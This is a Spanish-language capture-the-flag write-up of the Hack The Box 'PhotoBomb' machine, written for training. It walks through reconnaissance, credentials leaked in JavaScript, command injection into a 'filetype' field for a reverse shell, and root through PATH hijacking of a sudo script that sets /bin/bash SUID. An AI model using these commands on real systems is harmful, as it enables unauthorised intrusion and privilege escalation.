---
title: PhotoBomb Writeup
author: miguel3023
date: 2022-11-29
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy]
image:
  path: ../../assets/img/commons/PhotoBomb/PhotoBomb.png
  width: 800
  height: 450 
---

## Reconocimiento

Empezamos con un escaneo para detectar los puertos que están abiertos

```
❯ nmap -p- --min-rate 5000 --open -n -v -Pn 10.10.11.182 -oG OpenPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-29 18:11 -05
Initiating SYN Stealth Scan at 18:11
Scanning 10.10.11.182 [65535 ports]
Discovered open port 22/tcp on 10.10.11.182
Discovered open port 80/tcp on 10.10.11.182
Completed SYN Stealth Scan at 18:12, 14.69s elapsed (65535 total ports)
Nmap scan report for 10.10.11.182
Host is up (0.21s latency).
Not shown: 65529 closed tcp ports (reset), 4 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora vemos los servicios y la versión de los mismos en base a los puertos abiertos

```
❯ nmap -sC -sV -p22,80 10.10.11.182 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-29 18:33 -05
Nmap scan report for 10.10.11.182
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Con **whatweb** vemos el software que se está empleando en la página web por el puerto 80

```
❯ whatweb http://10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], 
IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
```

Vemos que nos hace un redirect, por lo tanto, añadimos el dominio al **/etc/hosts**

```
❯ echo "10.10.11.182  photobomb.htb" >> /etc/hosts
```
Volvemos a lanzar el **whatweb** y ya veremos lo que se emplea en la página

```
❯ whatweb http://photobomb.htb
http://photobomb.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, 
Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
```
Si nos vamos a la página, vemos que hay un "click here" que nos redirige a "printer". Pero nos pide credenciales si intentamos ir a esa ruta. Si vemos el código fuente veremos un "photobomb.js" y lo vemos, encontraremos las credenciales.

```js
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;

```

Ahora veremos que podemos descargar imágenes. Veremos cómo se realiza esa solicitud con **BurpSuite**

![Burpsuite]({{ 'assets/img/commons/PhotoBomb/BurpSuite.png' | relative_url }}){: .center-image }
_Petición por Burp_

En la parte de "filetype" podemos inyectar comandos, en este caso usaremos python3

`Nota:` Sé que es python porque si pones "http://photobomb.htb/printer/lll" y analisas el código, se ve un directorio con doble barra baja en la máquina local, eso me da a pensar que es con python.

En [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python) hay varias maneras de hacerlo. Antes que nada nos pondremos en escucha con nc por el puerto que le indicamos cuando carguemos el comando

![Burpsuite]({{ 'assets/img/commons/PhotoBomb/Injection.png' | relative_url }}){: .center-image }
_Inyección_

Hay que tener en cuenta que toca urlencodearlo

```
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.38] from (UNKNOWN) [10.10.11.182] 33430
/bin/sh: 0: can't access tty; job control turned off
$ whoami
wizard
$ hostname -I 
10.10.11.182
```
## Privesc

Vemos que tenemos privilegios sudoers para ejecutar un comando y también para cambiar las variables de entorno

```
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~/photobomb$ 
```

Vemos el script que podemos ejecutar

```bash
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```
Vemos que al final ejecuta el comando **find**, por lo tanto vamos a crearnos un fichero con ese nombre, para darle permisos SUID a la bash y le damos permiso de ejecución

```
wizard@photobomb:~/photobomb$ echo "chmod u+s /bin/bash" > find
wizard@photobomb:~/photobomb$ chmod +x find
```
Ahora modificamos el path para que nos ejecute primero nuestro fichero y listo, podemos leer la flag de root

```
wizard@photobomb:~/photobomb$ sudo PATH=$PWD:$PATH /opt/cleanup.sh 
wizard@photobomb:~/photobomb$ ls -l /bin/bash 
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
wizard@photobomb:~/photobomb$ bash -p 
bash-5.0# cat /root/root.txt 
bc983ca1c7d8dacebc86993f8f786c31
bash-5.0#
```
